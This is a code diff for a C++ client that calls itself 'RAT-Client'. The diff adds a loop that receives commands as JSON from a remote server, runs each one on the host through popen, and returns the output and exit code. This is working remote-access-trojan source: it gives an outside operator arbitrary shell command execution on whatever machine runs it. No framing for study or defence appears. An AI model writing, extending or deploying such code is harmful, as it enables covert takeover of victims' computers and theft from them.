@@ -1,5 +1,8 @@
 #include "ClientManager.hpp"
 #include <iostream>
+#include <thread>
+#include <cstdio>
+#include <cerrno>
 
 namespace Client {
 
@@ -66,13 +69,45 @@ int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
     ClientController *ctrl = getController(name);
     if (!ctrl) return 2;
 
+    // initial greeting
     nlohmann::json out;
     out["msg"] = "Hello from RAT-Client";
-    if (!ctrl->sendJson(out)) return 3;
+    if (!ctrl->sendJson(out)) {
+        disconnect(name);
+        return 3;
+    }
 
-    nlohmann::json in;
-    if (!ctrl->receiveJson(in)) return 4;
-    std::cout << "Server: " << in.dump() << std::endl;
+    // main loop: wait for commands in JSON form {"cmd": "..."}
+    while (isConnected(name)) {
+        nlohmann::json in;
+        if (!ctrl->receiveJson(in)) {
+            // no message yet; small sleep
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            continue;
+        }
+        // if there's a cmd field, execute it
+        if (in.contains("cmd") && in["cmd"].is_string()) {
+            std::string cmd = in["cmd"].get<std::string>();
+            // special-case: empty cmd or "exit" -> disconnect
+            if (cmd == "exit") break;
+            // run via popen and capture output
+            std::string output;
+            int retcode = 0;
+            FILE *p = popen(cmd.c_str(), "r");
+            if (!p) {
+                output = std::string("popen failed: ") + std::strerror(errno);
+                retcode = -1;
+            } else {
+                char buf[512];
+                while (fgets(buf, sizeof(buf), p) != nullptr) {
+                    output += buf;
+                }
+                retcode = pclose(p);
+            }
+            nlohmann::json reply{ {"out", output}, {"ret", retcode} };
+            ctrl->sendJson(reply);
+        }
+    }
 
     disconnect(name);
     return 0;
